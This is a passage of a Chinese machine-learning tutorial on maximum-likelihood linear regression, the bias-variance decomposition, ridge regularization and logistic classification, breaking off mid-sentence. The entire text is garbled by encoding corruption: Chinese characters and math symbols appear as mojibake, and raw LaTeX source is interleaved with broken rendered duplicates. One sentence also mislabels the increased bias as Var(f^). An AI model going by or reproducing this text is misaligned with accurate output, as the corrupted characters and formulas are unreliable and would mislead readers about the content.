æ®æ­¤æ”¹å†™æ¨¡å‹ï¼š yi=âˆ‘j=1mwjXij+Ïµi âˆ¼âˆ‘j=1mwjXij+N(0,Ïƒ2) p(yiâˆ£X;w)=N(âˆ‘j=1mwjXij,Ïƒ2)\\begin{array}{rcl} y_i &amp;=&amp; \\sum_{j=1}^m w_j X_{ij} + \\epsilon_i \\ &amp;\\sim&amp; \\sum_{j=1}^m w_j X_{ij} + \\mathcal{N}\\left(0, \\sigma^2\\right) \\ p\\left(y_i \\mid \\textbf X; \\textbf{w}\\right) &amp;=&amp; \\mathcal{N}\\left(\\sum_{j=1}^m w_j X_{ij}, \\sigma^2\\right) \\end{array} yiâ€‹â€‹=â€‹âˆ‘j=1mâ€‹wjâ€‹Xijâ€‹+Ïµiâ€‹ â€‹âˆ¼â€‹âˆ‘j=1mâ€‹wjâ€‹Xijâ€‹+N(0,Ïƒ2) p(yiâ€‹âˆ£X;w)â€‹=â€‹N(âˆ‘j=1mâ€‹wjâ€‹Xijâ€‹,Ïƒ2)â€‹ ç”±äºæ ·æœ¬æ˜¯ç‹¬ç«‹æŠ½å–çš„ï¼ˆè¯¯å·®ä¸ç›¸å…³æ˜¯é«˜æ–¯-é©¬å°”å¯å¤«å®šç†çš„æ¡ä»¶ä¹‹ä¸€ï¼‰ï¼Œæ•°æ®çš„ä¼¼ç„¶çœ‹èµ·æ¥ä¼šæ˜¯å¯†åº¦å‡½æ•° ğ‘(ğ‘¦ğ‘–)p(y**i) çš„ç§¯ã€‚è½¬åŒ–ä¸ºå¯¹æ•°å½¢å¼ï¼š logâ¡p(yâˆ£X;w)=logâ¡âˆi=1nN(âˆ‘j=1mwjXij,Ïƒ2) =âˆ‘i=1nlogâ¡N(âˆ‘j=1mwjXij,Ïƒ2) =âˆ’n2logâ¡2Ï€Ïƒ2âˆ’12Ïƒ2âˆ‘i=1n(yiâˆ’wTxi)2\\begin{array}{rcl} \\log p\\left(\\textbf{y}\\mid \\textbf X; \\textbf{w}\\right) &amp;=&amp; \\log \\prod_{i=1}^n \\mathcal{N}\\left(\\sum_{j=1}^m w_j X_{ij}, \\sigma^2\\right) \\ &amp;=&amp; \\sum_{i=1}^n \\log \\mathcal{N}\\left(\\sum_{j=1}^m w_j X_{ij}, \\sigma^2\\right) \\ &amp;=&amp; -\\frac{n}{2}\\log 2\\pi\\sigma^2 -\\frac{1}{2\\sigma^2} \\sum_{i=1}^n \\left(y_i - \\textbf{w}^\\text{T} \\textbf{x}_i\\right)^2 \\end{array} logp(yâˆ£X;w)â€‹=â€‹logâˆi=1nâ€‹N(âˆ‘j=1mâ€‹wjâ€‹Xijâ€‹,Ïƒ2) â€‹=â€‹âˆ‘i=1nâ€‹logN(âˆ‘j=1mâ€‹wjâ€‹Xijâ€‹,Ïƒ2) â€‹=â€‹âˆ’2nâ€‹log2Ï€Ïƒ2âˆ’2Ïƒ21â€‹âˆ‘i=1nâ€‹(yiâ€‹âˆ’wTxiâ€‹)2â€‹ æƒ³è¦æ‰¾åˆ°æœ€å¤§ä¼¼ç„¶å‡è®¾ï¼Œå³éœ€è¦æœ€å¤§åŒ–è¡¨è¾¾å¼ ğ‘(yâˆ£X;w)p(yâˆ£X;w) ä»¥å¾—åˆ° wMLwMLï¼Œè¿™å’Œæœ€å¤§åŒ–å…¶å¯¹æ•°æ˜¯ä¸€å›äº‹ã€‚æ³¨æ„ï¼Œå½“é’ˆå¯¹æŸä¸ªå‚æ•°æœ€å¤§åŒ–å‡½æ•°æ—¶ï¼Œå¯ä»¥ä¸¢å¼ƒæ‰€æœ‰ä¸ä¾èµ–è¿™ä¸€å‚æ•°çš„å˜é‡ï¼š wML=argâ¡maxâ¡wp(yâˆ£X;w)=argâ¡maxâ¡wlogâ¡p(yâˆ£X;w)=argâ¡maxâ¡wâˆ’n2logâ¡2Ï€Ïƒ2âˆ’12Ïƒ2âˆ‘i=1n(yiâˆ’wTxi)2=argâ¡maxâ¡wâˆ’12Ïƒ2âˆ‘i=1n(yiâˆ’wTxi)2=argâ¡minâ¡wL(X,y,w) \\begin{array}{rcl} \\textbf{w}_{\\text{ML}} &amp;=&amp; \\arg \\max_{\\textbf w} p\\left(\\textbf{y}\\mid \\textbf X; \\textbf{w}\\right) = \\arg \\max_{\\textbf w} \\log p\\left(\\textbf{y}\\mid \\textbf X; \\textbf{w}\\right)\\\\ &amp;=&amp; \\arg \\max_{\\textbf w} -\\frac{n}{2}\\log 2\\pi\\sigma^2 -\\frac{1}{2\\sigma^2} \\sum_{i=1}^n \\left(y_i - \\textbf{w}^{\\text{T}} \\textbf{x}_i\\right)^2 \\\\ &amp;=&amp; \\arg \\max_{\\textbf w} -\\frac{1}{2\\sigma^2} \\sum_{i=1}^n \\left(y_i - \\textbf{w}^{\\text{T}} \\textbf{x}_i\\right)^2 \\\\ &amp;=&amp; \\arg \\min_{\\textbf w} \\mathcal{L}\\left(\\textbf X, \\textbf{y}, \\textbf{w} \\right) \\end{array}wMLâ€‹â€‹====â€‹argmaxwâ€‹p(yâˆ£X;w)=argmaxwâ€‹logp(yâˆ£X;w)argmaxwâ€‹âˆ’2nâ€‹log2Ï€Ïƒ2âˆ’2Ïƒ21â€‹âˆ‘i=1nâ€‹(yiâ€‹âˆ’wTxiâ€‹)2argmaxwâ€‹âˆ’2Ïƒ21â€‹âˆ‘i=1nâ€‹(yiâ€‹âˆ’wTxiâ€‹)2argminwâ€‹L(X,y,w)â€‹ æ‰€ä»¥ï¼Œå½“æµ‹é‡è¯¯å·®æœä»æ­£æ€ï¼ˆé«˜æ–¯ï¼‰åˆ†å¸ƒçš„æƒ…å†µä¸‹ï¼Œ æœ€å°äºŒä¹˜æ³•ç­‰ä»·äºæå¤§ä¼¼ç„¶ä¼°è®¡ã€‚ åç½®-æ–¹å·®åˆ†è§£ ä¸‹é¢è®¨è®ºçº¿æ€§å›å½’é¢„æµ‹çš„è¯¯å·®æ€§è´¨ï¼ˆå¯ä»¥æ¨å¹¿åˆ°æœºå™¨å­¦ä¹ ç®—æ³•ä¸Šï¼‰ï¼Œä¸Šæ–‡æåˆ°ï¼š ç›®æ ‡å˜é‡çš„çœŸå€¼ yyy æ˜¯ç¡®å®šæ€§å‡½æ•° f(x)f\\left(\\textbf{x}\\right)f(x) å’Œéšæœºè¯¯å·® Ïµ\\epsilonÏµ ä¹‹å’Œï¼šy=f(x)+Ïµy = f\\left(\\textbf{x}\\right) + \\epsilony=f(x)+Ïµã€‚ è¯¯å·®ç¬¦åˆå‡å€¼ä¸ºé›¶ã€æ–¹å·®ä¸€è‡´çš„æ­£æ€åˆ†å¸ƒï¼šÏµâˆ¼N(0,Ïƒ2)\\epsilon \\sim \\mathcal{N}\\left(0, \\sigma^2\\right)Ïµâˆ¼N(0,Ïƒ2)ã€‚ ç›®æ ‡å˜é‡çš„çœŸå€¼äº¦ä¸ºæ­£æ€åˆ†å¸ƒï¼šyâˆ¼N(f(x),Ïƒ2)y \\sim \\mathcal{N}\\left(f\\left(\\textbf{x}\\right), \\sigma^2\\right)yâˆ¼N(f(x),Ïƒ2)ã€‚ è¯•å›¾ä½¿ç”¨ä¸€ä¸ªåå˜é‡çº¿æ€§å‡½æ•°é€¼è¿‘ä¸€ä¸ªæœªçŸ¥çš„ç¡®å®šæ€§å‡½æ•° f(x)f\\left(\\textbf{x}\\right)f(x)ï¼Œè¿™ä¸€åå˜é‡çº¿æ€§å‡½æ•°æ˜¯å‡½æ•°ç©ºé—´ä¸­ä¼°è®¡å‡½æ•° fff çš„ä¸€ç‚¹ï¼Œå³å‡å€¼å’Œæ–¹å·®çš„éšæœºå˜é‡ã€‚ å› æ­¤ï¼Œç‚¹ xx çš„è¯¯å·®å¯åˆ†è§£ä¸ºï¼š Err(x)=E[(yâˆ’f^(x))2] =E[y2]+E[(f^(x))2]âˆ’2E[yf^(x)] =E[y2]+E[f^2]âˆ’2E[yf^] \\begin{array}{rcl} \\text{Err}\\left(\\textbf{x}\\right) &amp;=&amp; \\mathbb{E}\\left[\\left(y - \\widehat{f}\\left(\\textbf{x}\\right)\\right)^2\\right] \\ &amp;=&amp; \\mathbb{E}\\left[y^2\\right] + \\mathbb{E}\\left[\\left(\\widehat{f}\\left(\\textbf{x}\\right)\\right)^2\\right] - 2\\mathbb{E}\\left[y\\widehat{f}\\left(\\textbf{x}\\right)\\right] \\ &amp;=&amp; \\mathbb{E}\\left[y^2\\right] + \\mathbb{E}\\left[\\widehat{f}^2\\right] - 2\\mathbb{E}\\left[y\\widehat{f}\\right] \\ \\end{array} Err(x)â€‹=â€‹E[(yâˆ’fâ€‹(x))2] â€‹=â€‹E[y2]+E[(fâ€‹(x))2]âˆ’2E[yfâ€‹(x)] â€‹=â€‹E[y2]+E[fâ€‹2]âˆ’2E[yfâ€‹] â€‹ ä¸ºäº†ç®€æ´ï¼Œçœç•¥å‡½æ•°çš„å‚æ•°ï¼Œåˆ†åˆ«è€ƒè™‘æ¯ä¸ªå˜é‡ã€‚æ ¹æ®å…¬å¼ Var(ğ‘§)=ğ¸[ğ‘§2]âˆ’ğ¸[ğ‘§]2Var(z)=E[z2]âˆ’E[z]2 å¯ä»¥åˆ†è§£å‰ä¸¤é¡¹ä¸ºï¼š E[y2]=Var(y)+E[y]2=Ïƒ2+f2 E[f^2]=Var(f^)+E[f^]2 \\begin{array}{rcl} \\mathbb{E}\\left[y^2\\right] &amp;=&amp; \\text{Var}\\left(y\\right) + \\mathbb{E}\\left[y\\right]^2 = \\sigma^2 + f^2\\ \\mathbb{E}\\left[\\widehat{f}^2\\right] &amp;=&amp; \\text{Var}\\left(\\widehat{f}\\right) + \\mathbb{E}\\left[\\widehat{f}\\right]^2 \\ \\end{array} E[y2]â€‹=â€‹Var(y)+E[y]2=Ïƒ2+f2 E[fâ€‹2]â€‹=â€‹Var(fâ€‹)+E[fâ€‹]2 â€‹ æ³¨æ„ï¼š Var(y)=E[(yâˆ’E[y])2] =E[(yâˆ’f)2] =E[(f+Ïµâˆ’f)2] =E[Ïµ2]=Ïƒ2\\begin{array}{rcl} \\text{Var}\\left(y\\right) &amp;=&amp; \\mathbb{E}\\left[\\left(y - \\mathbb{E}\\left[y\\right]\\right)^2\\right] \\ &amp;=&amp; \\mathbb{E}\\left[\\left(y - f\\right)^2\\right] \\ &amp;=&amp; \\mathbb{E}\\left[\\left(f + \\epsilon - f\\right)^2\\right] \\ &amp;=&amp; \\mathbb{E}\\left[\\epsilon^2\\right] = \\sigma^2 \\end{array} Var(y)â€‹=â€‹E[(yâˆ’E[y])2] â€‹=â€‹E[(yâˆ’f)2] â€‹=â€‹E[(f+Ïµâˆ’f)2] â€‹=â€‹E[Ïµ2]=Ïƒ2â€‹ ğ¸[ğ‘¦]=ğ¸[ğ‘“+ğœ–]=ğ¸[ğ‘“]+ğ¸[ğœ–]=ğ‘“E[y]=E[f+Ïµ]=E[f]+E[Ïµ]=f æ¥ç€å¤„ç†å’Œçš„æœ€åä¸€é¡¹ã€‚ç”±äºè¯¯å·®å’Œç›®æ ‡å˜é‡ç›¸äº’ç‹¬ç«‹ï¼Œæ‰€ä»¥å¯ä»¥å°†å®ƒä»¬åˆ†ç¦»ï¼Œå†™ä¸ºï¼š E[yf^]=E[(f+Ïµ)f^] =E[ff^]+E[Ïµf^] =fE[f^]+E[Ïµ]E[f^]=fE[f^]\\begin{array}{rcl} \\mathbb{E}\\left[y\\widehat{f}\\right] &amp;=&amp; \\mathbb{E}\\left[\\left(f + \\epsilon\\right)\\widehat{f}\\right] \\ &amp;=&amp; \\mathbb{E}\\left[f\\widehat{f}\\right] + \\mathbb{E}\\left[\\epsilon\\widehat{f}\\right] \\ &amp;=&amp; f\\mathbb{E}\\left[\\widehat{f}\\right] + \\mathbb{E}\\left[\\epsilon\\right] \\mathbb{E}\\left[\\widehat{f}\\right] = f\\mathbb{E}\\left[\\widehat{f}\\right] \\end{array} E[yfâ€‹]â€‹=â€‹E[(f+Ïµ)fâ€‹] â€‹=â€‹E[ffâ€‹]+E[Ïµfâ€‹] â€‹=â€‹fE[fâ€‹]+E[Ïµ]E[fâ€‹]=fE[fâ€‹]â€‹ æœ€åï¼Œå°†ä¸Šè¿°å…¬å¼åˆå¹¶ä¸ºï¼š Err(x)=E[(yâˆ’f^(x))2] =Ïƒ2+f2+Var(f^)+E[f^]2âˆ’2fE[f^] =(fâˆ’E[f^])2+Var(f^)+Ïƒ2 =Bias(f^)2+Var(f^)+Ïƒ2\\begin{array}{rcl} \\text{Err}\\left(\\textbf{x}\\right) &amp;=&amp; \\mathbb{E}\\left[\\left(y - \\widehat{f}\\left(\\textbf{x}\\right)\\right)^2\\right] \\ &amp;=&amp; \\sigma^2 + f^2 + \\text{Var}\\left(\\widehat{f}\\right) + \\mathbb{E}\\left[\\widehat{f}\\right]^2 - 2f\\mathbb{E}\\left[\\widehat{f}\\right] \\ &amp;=&amp; \\left(f - \\mathbb{E}\\left[\\widehat{f}\\right]\\right)^2 + \\text{Var}\\left(\\widehat{f}\\right) + \\sigma^2 \\ &amp;=&amp; \\text{Bias}\\left(\\widehat{f}\\right)^2 + \\text{Var}\\left(\\widehat{f}\\right) + \\sigma^2 \\end{array} Err(x)â€‹=â€‹E[(yâˆ’fâ€‹(x))2] â€‹=â€‹Ïƒ2+f2+Var(fâ€‹)+E[fâ€‹]2âˆ’2fE[fâ€‹] â€‹=â€‹(fâˆ’E[fâ€‹])2+Var(fâ€‹)+Ïƒ2 â€‹=â€‹Bias(fâ€‹)2+Var(fâ€‹)+Ïƒ2â€‹ ç”±æ­¤ï¼Œä»ä¸Šç­‰å¼å¯çŸ¥ï¼Œä»»ä½•çº¿æ€§æ¨¡å‹çš„é¢„æµ‹è¯¯å·®ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š åå·®ï¼ˆbiasï¼‰: Bias(f^)\\text{Bias}\\left(\\widehat{f}\\right)Bias(fâ€‹) åº¦é‡äº†å­¦ä¹ ç®—æ³•çš„æœŸæœ›è¾“å‡ºä¸çœŸå®ç»“æœçš„åç¦»ç¨‹åº¦, åˆ»ç”»äº†ç®—æ³•çš„æ‹Ÿåˆèƒ½åŠ›ï¼Œåå·®åé«˜è¡¨ç¤ºé¢„æµ‹å‡½æ•°ä¸çœŸå®ç»“æœå·®å¼‚å¾ˆå¤§ã€‚ æ–¹å·®ï¼ˆvarianceï¼‰: Var(f^)\\text{Var}\\left(\\widehat{f}\\right)Var(fâ€‹) ä»£è¡¨ã€ŒåŒæ ·å¤§å°çš„ä¸åŒçš„è®­ç»ƒæ•°æ®é›†è®­ç»ƒå‡ºçš„æ¨¡å‹ã€ä¸ã€Œè¿™äº›æ¨¡å‹çš„æœŸæœ›è¾“å‡ºå€¼ã€ä¹‹é—´çš„å·®å¼‚ã€‚è®­ç»ƒé›†å˜åŒ–å¯¼è‡´æ€§èƒ½å˜åŒ–ï¼Œæ–¹å·®åé«˜è¡¨ç¤ºæ¨¡å‹å¾ˆä¸ç¨³å®šã€‚ ä¸å¯æ¶ˆé™¤çš„è¯¯å·®ï¼ˆirremovable errorï¼‰: Ïƒ2\\sigma^2Ïƒ2 åˆ»ç”»äº†å½“å‰ä»»åŠ¡ä»»ä½•ç®—æ³•æ‰€èƒ½è¾¾åˆ°çš„æœŸæœ›æ³›åŒ–è¯¯å·®çš„ä¸‹ç•Œï¼Œå³åˆ»ç”»äº†é—®é¢˜æœ¬èº«çš„éš¾åº¦ã€‚ å°½ç®¡æ— æ³•æ¶ˆé™¤ Ïƒ2\\sigma^2Ïƒ2ï¼Œä½†æˆ‘ä»¬å¯ä»¥å½±å“å‰ä¸¤é¡¹ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œå¸Œæœ›åŒæ—¶æ¶ˆé™¤åå·®å’Œæ–¹å·®ï¼ˆè§ä¸‹å›¾ä¸­å·¦ä¸Šï¼‰ï¼Œä½†æ˜¯åœ¨å®è·µä¸­ï¼Œå¸¸å¸¸éœ€è¦åœ¨åç½®å’Œä¸ç¨³å®šï¼ˆé«˜æ–¹å·®ï¼‰é—´å¯»æ‰¾å¹³è¡¡ã€‚ ä¸€èˆ¬è€Œè¨€ï¼Œå½“æ¨¡å‹çš„è®¡ç®—é‡å¢åŠ æ—¶ï¼ˆä¾‹å¦‚ï¼Œè‡ªç”±å‚æ•°çš„æ•°é‡å¢åŠ äº†ï¼‰ï¼Œä¼°è®¡çš„æ–¹å·®ï¼ˆåˆ†æ•£ç¨‹åº¦ï¼‰ä¹Ÿä¼šå¢åŠ ï¼Œä½†åç½®ä¼šä¸‹é™ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´è¿‡æ‹Ÿåˆç°è±¡ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœæ¨¡å‹çš„è®¡ç®—é‡å¤ªå°‘ï¼ˆä¾‹å¦‚ï¼Œè‡ªç”±å‚æ•°è¿‡ä½)ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æ¬ æ‹Ÿåˆç°è±¡ã€‚ é«˜æ–¯-é©¬å°”å¯å¤«å®šç†è¡¨æ˜ï¼šåœ¨çº¿æ€§æ¨¡å‹å‚æ•°ä¼°è®¡é—®é¢˜ä¸­ï¼ŒOLS ä¼°è®¡æ˜¯æœ€ä½³çš„çº¿æ€§æ— åä¼°è®¡ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœå­˜åœ¨ä»»ä½•æ— åçº¿æ€§æ¨¡å‹ gï¼Œå¯ä»¥ç¡®ä¿¡ Var(f^)â‰¤Var(g)Var\\left(\\widehat{f}\\right) \\leq Var\\left(g\\right)Var(fâ€‹)â‰¤Var(g)ã€‚ çº¿æ€§å›å½’çš„æ­£åˆ™åŒ– ä½åç½®å’Œä½æ–¹å·®å¾€å¾€æ˜¯ä¸å¯å…¼å¾—çš„ï¼Œæ‰€ä»¥åœ¨ä¸€äº›æƒ…å½¢ä¸‹ï¼Œä¼šä¸ºäº†ç¨³å®šæ€§ï¼ˆé™ä½æ¨¡å‹çš„æ–¹å·®ï¼‰è€Œå¯¼è‡´æ¨¡å‹çš„åç½® Var(f^)\\text{Var}\\left(\\widehat{f}\\right)Var(fâ€‹) æé«˜ã€‚é«˜æ–¯-é©¬å°”å¯å¤«å®šç†æˆç«‹çš„æ¡ä»¶ä¹‹ä¸€å°±æ˜¯çŸ©é˜µ X\\textbf{X}X æ˜¯æ»¡ç§©çš„ï¼Œå¦åˆ™ OLS çš„è§£ w=(XTX)âˆ’1XTy\\textbf{w} = \\left(\\textbf{X}^\\text{T} \\textbf{X}\\right)^{-1} \\textbf{X}^\\text{T} \\textbf{y}w=(XTX)âˆ’1XTy å°±ä¸å­˜åœ¨ï¼Œå› ä¸ºé€†çŸ©é˜µ (XTX)âˆ’1\\left(\\textbf{X}^\\text{T} \\textbf{X}\\right)^{-1}(XTX)âˆ’1 ä¸å­˜åœ¨ï¼Œæ­¤æ—¶çŸ©é˜µ XTX\\textbf{X}^\\text{T} \\textbf{X}XTX è¢«ç§°ä¸ºå¥‡å¼‚çŸ©é˜µæˆ–é€€åŒ–çŸ©é˜µã€‚è¿™ç±»é—®é¢˜è¢«ç§°ä¸ºç—…æ€é—®é¢˜ï¼Œå¿…é¡»åŠ ä»¥çŸ«æ­£ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒçŸ©é˜µ XTX\\textbf{X}^\\text{T} \\textbf{X}XTX éœ€è¦å˜æˆéå¥‡å¼‚çŸ©é˜µï¼ˆè¿™æ­£æ˜¯è¿™ä¸€è¿‡ç¨‹å«åšæ­£åˆ™åŒ–çš„åŸå› ï¼‰ã€‚ æˆ‘ä»¬å¸¸å¸¸èƒ½åœ¨è¿™ç±»æ•°æ®ä¸­è§‚å¯Ÿåˆ°æ‰€è°“çš„å¤šé‡å…±çº¿æ€§ï¼šä¸¤ä¸ªæˆ–æ›´å¤šç‰¹å¾é«˜åº¦ç›¸å…³ï¼Œä¹Ÿå°±æ˜¯çŸ©é˜µ XX çš„åˆ—ä¹‹é—´å­˜åœ¨ç±»ä¼¼çº¿æ€§ä¾èµ–çš„å…³ç³»ï¼ˆåˆä¸å®Œå…¨æ˜¯çº¿æ€§ä¾èµ–ï¼‰ã€‚ä¾‹å¦‚ï¼Œåœ¨ã€ŒåŸºäºç‰¹å¾é¢„æµ‹æˆ¿ä»·ã€è¿™ä¸€é—®é¢˜ä¸­ï¼Œå±æ€§ã€Œå«é˜³å°çš„é¢ç§¯ã€å’Œã€Œä¸å«é˜³å°çš„é¢ç§¯ã€ä¼šæœ‰ä¸€ä¸ªæ¥è¿‘çº¿æ€§ä¾èµ–çš„å…³ç³»ã€‚æ•°å­¦ä¸Šï¼ŒåŒ…å«è¿™ç±»æ•°æ®çš„çŸ©é˜µ XTXXTX è¢«ç§°ä¸ºå¯é€†çŸ©é˜µï¼Œä½†ç”±äºå¤šé‡å…±çº¿æ€§ï¼Œä¸€äº›æœ¬å¾å€¼ï¼ˆç‰¹å¾å€¼ï¼‰ä¼šæ¥è¿‘é›¶ã€‚åœ¨ XTXXTX çš„é€†çŸ©é˜µä¸­ï¼Œå› ä¸ºå…¶æœ¬å¾å€¼ä¸º 1ğœ†ğ‘–Î»**i1ï¼Œæ‰€ä»¥æœ‰äº›æœ¬å¾å€¼ä¼šå˜å¾—ç‰¹åˆ«å¤§ã€‚æœ¬å¾å€¼è¿™ç§å·¨å¤§çš„æ•°å€¼æ³¢åŠ¨ä¼šå¯¼è‡´æ¨¡å‹å‚æ•°ä¼°è®¡çš„ä¸ç¨³å®šï¼Œå³åœ¨è®­ç»ƒæ•°æ®ä¸­åŠ å…¥ä¸€ç»„æ–°çš„è§‚æµ‹ä¼šå¯¼è‡´å®Œå…¨ä¸åŒçš„è§£ã€‚ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œæœ‰ä¸€ç§æ­£åˆ™åŒ–çš„æ–¹æ³•ç§°ä¸ºå‰æ´ªè¯ºå¤«ï¼ˆTikhonovï¼‰æ­£åˆ™åŒ–ï¼Œå¤§è‡´ä¸Šæ˜¯åœ¨å‡æ–¹è¯¯å·®ä¸­åŠ ä¸Šä¸€ä¸ªæ–°å˜é‡ï¼š L(X,y,w)=12nâˆ¥yâˆ’Xwâˆ¥22+âˆ¥Î“wâˆ¥2\\begin{array}{rcl} \\mathcal{L}\\left(\\textbf{X}, \\textbf{y}, \\textbf{w} \\right) &amp;=&amp; \\frac{1}{2n} \\left\\| \\textbf{y} - \\textbf{X} \\textbf{w} \\right\\|_2^2 + \\left\\| \\Gamma \\textbf{w}\\right\\|^2\\end{array} L(X,y,w)â€‹=â€‹2n1â€‹âˆ¥yâˆ’Xwâˆ¥22â€‹+âˆ¥Î“wâˆ¥2â€‹ å‰æ´ªè¯ºå¤«çŸ©é˜µå¸¸å¸¸è¡¨è¾¾ä¸ºå•ä½çŸ©é˜µä¹˜ä¸Šä¸€ä¸ªç³»æ•°ï¼šÎ“=Î»2E\\Gamma = \\frac{\\lambda}{2} EÎ“=2Î»â€‹Eã€‚åœ¨è¿™ä¸€æƒ…å½¢ä¸‹ï¼Œæœ€å°åŒ–å‡æ–¹è¯¯å·®é—®é¢˜å˜ä¸ºä¸€ä¸ª L2 æ­£åˆ™åŒ–é—®é¢˜ã€‚è‹¥å¯¹æ–°çš„æŸå¤±å‡½æ•°æ±‚å¯¼ï¼Œè®¾æ‰€å¾—å‡½æ•°ä¸ºé›¶ï¼Œæ® w\\textbf{w}w é‡æ•´ç­‰å¼ï¼Œä¾¿å¾—åˆ°äº†è¿™ä¸€é—®é¢˜çš„è§£ï¼š w=(XTX+Î»E)âˆ’1XTy \\begin{array}{rcl} \\textbf{w} &amp;=&amp; \\left(\\textbf{X}^{\\text{T}} \\textbf{X} + \\lambda \\textbf{E}\\right)^{-1} \\textbf{X}^{\\text{T}} \\textbf{y} \\end{array}wâ€‹=â€‹(XTX+Î»E)âˆ’1XTyâ€‹ è¿™ç±»å›å½’è¢«ç§°ä¸ºå²­å›å½’ï¼ˆridge regressionï¼‰ã€‚å²­ä¸ºå¯¹è§’çŸ©é˜µï¼Œåœ¨ XTX\\textbf{X}^\\text{T} \\textbf{X}XTX çŸ©é˜µä¸ŠåŠ ä¸Šè¿™ä¸€å¯¹è§’çŸ©é˜µï¼Œä»¥ç¡®ä¿èƒ½å¾—åˆ°ä¸€ä¸ªæ­£åˆ™çŸ©é˜µã€‚ è¿™æ ·çš„è§£é™ä½äº†æ–¹å·®ï¼Œä½†å¢åŠ äº†åç½®ï¼Œå› ä¸ºå‚æ•°çš„æ­£åˆ™å‘é‡ä¹Ÿè¢«æœ€å°åŒ–äº†ï¼Œè¿™å¯¼è‡´è§£æœé›¶ç§»åŠ¨ã€‚åœ¨ä¸‹å›¾ä¸­ï¼ŒOLS è§£ä¸ºç™½è‰²è™šçº¿çš„äº¤ç‚¹ï¼Œè“ç‚¹è¡¨ç¤ºå²­å›å½’çš„ä¸åŒè§£ã€‚å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡å¢åŠ æ­£åˆ™åŒ–å‚æ•° Î»\\lambdaÎ»ï¼Œä½¿è§£æœé›¶ç§»åŠ¨ã€‚ çº¿æ€§åˆ†ç±» çº¿æ€§åˆ†ç±»å™¨èƒŒåçš„åŸºæœ¬æ€è·¯æ˜¯ï¼Œç›®æ ‡åˆ†ç±»çš„å€¼å¯ä»¥è¢«ç‰¹å¾ç©ºé—´ä¸­çš„ä¸€ä¸ªè¶…å¹³é¢åˆ†å¼€ã€‚å¦‚æœè¿™å¯ä»¥æ— è¯¯å·®åœ°è¾¾æˆï¼Œé‚£ä¹ˆè®­ç»ƒé›†è¢«ç§°ä¸ºçº¿æ€§å¯åˆ†ã€‚ ä¸Šé¢å·²ç»ä»‹ç»äº†çº¿æ€§å›å½’å’Œæ™®é€šæœ€å°äºŒä¹˜æ³•ï¼ˆOLSï¼‰ã€‚ç°åœ¨è€ƒè™‘ä¸€ä¸ªäºŒå…ƒåˆ†ç±»é—®é¢˜ï¼Œå°†ç›®æ ‡åˆ†ç±»è®°ä¸ºã€Œ+1ã€ï¼ˆæ­£é¢æ ·æœ¬ï¼‰å’Œã€Œ-1ã€ï¼ˆè´Ÿé¢æ ·æœ¬ï¼‰ã€‚æœ€ç®€å•çš„çº¿æ€§åˆ†ç±»å™¨å¯ä»¥é€šè¿‡å›å½’å®šä¹‰ï¼š a(x)=sign(wTx)a(\\textbf{x}) = \\text{sign}(\\textbf{w}^\\text{T}\\textbf x) a(x)=sign(wTx) å…¶ä¸­ï¼š x\\textbf{x}x æ˜¯ç‰¹å¾å‘é‡ï¼ˆåŒ…æ‹¬æ ‡è¯†ï¼‰ã€‚ w\\textbf{w}w æ˜¯çº¿æ€§æ¨¡å‹ä¸­çš„æƒé‡å‘é‡ï¼ˆåç½®ä¸º w0w_0w0â€‹ï¼‰ã€‚ sign(âˆ™)\\text{sign}(\\bullet)sign(âˆ™) æ˜¯ç¬¦å·å‡½æ•°ï¼Œè¿”å›å‚æ•°çš„ç¬¦å·ã€‚ a(x)a(\\textbf{x})a(x) æ˜¯åˆ†ç±» x\\textbf{x}x çš„åˆ†ç±»å™¨ã€‚ åŸºäºé€»è¾‘å›å½’çš„çº¿æ€§åˆ†ç±»å™¨ é€»è¾‘å›å½’æ˜¯çº¿æ€§åˆ†ç±»å™¨çš„ä¸€ä¸ªç‰¹æ®Šæƒ…å½¢ï¼Œä½†é€»è¾‘å›å½’æœ‰ä¸€ä¸ªé¢å¤–çš„ä¼˜ç‚¹ï¼šå®ƒå¯ä»¥é¢„æµ‹æ ·æœ¬ xi\\textbf{x}_\\text{i}xiâ€‹ ä¸ºåˆ†ç±»ã€Œ+ã€çš„æ¦‚ç‡ p+p_+p+â€‹ï¼š p+=P(yi=1âˆ£xi,w)p_+ = P\\left(y_i = 1 \\mid \\textbf{x}_\\text{i}, \\textbf{w}\\right) p+â€‹=P(yiâ€‹=1âˆ£xiâ€‹,w) é€»è¾‘å›å½’ä¸ä»…èƒ½å¤Ÿé¢„æµ‹æ ·æœ¬æ˜¯ã€Œ+1ã€è¿˜æ˜¯ã€Œ-1ã€ï¼Œè¿˜èƒ½é¢„æµ‹å…¶åˆ†åˆ«æ˜¯ã€Œ+1ã€å’Œã€Œ-1ã€çš„æ¦‚ç‡æ˜¯å¤šå°‘ã€‚å¯¹äºå¾ˆå¤šä¸šåŠ¡é—®é¢˜ï¼ˆæ¯”å¦‚ï¼Œä¿¡ç”¨è¯„åˆ†é—®é¢˜ï¼‰è€Œè¨€ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„ä¼˜ç‚¹ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªé¢„æµ‹è´·æ¬¾è¿çº¦æ¦‚ç‡çš„ä¾‹å­ã€‚ é“¶è¡Œé€‰æ‹©ä¸€ä¸ªé˜ˆå€¼ pâˆ—p_*pâˆ—â€‹ ä»¥é¢„æµ‹è´·æ¬¾è¿çº¦çš„æ¦‚ç‡ï¼ˆä¸Šå›¾ä¸­é˜ˆå€¼ä¸º0.15ï¼‰ï¼Œè¶…è¿‡é˜ˆå€¼å°±ä¸æ‰¹å‡†è´·æ¬¾ã€‚ ä¸ºäº†é¢„æµ‹æ¦‚ç‡ p+âˆˆ[0,1]p_+ \\in [0,1]p+â€‹âˆˆ[0,1]ï¼Œä½¿ç”¨ OLS æ„é€ çº¿æ€§é¢„æµ‹ï¼š b(x)=wTxâˆˆRb(\\textbf{x}) = \\textbf{w}^\\text{T} \\textbf{x} \\in \\mathbb{R} b(x)=wTxâˆˆR ä¸ºäº†å°†æ‰€å¾—ç»“æœè½¬æ¢ä¸º [0,1] 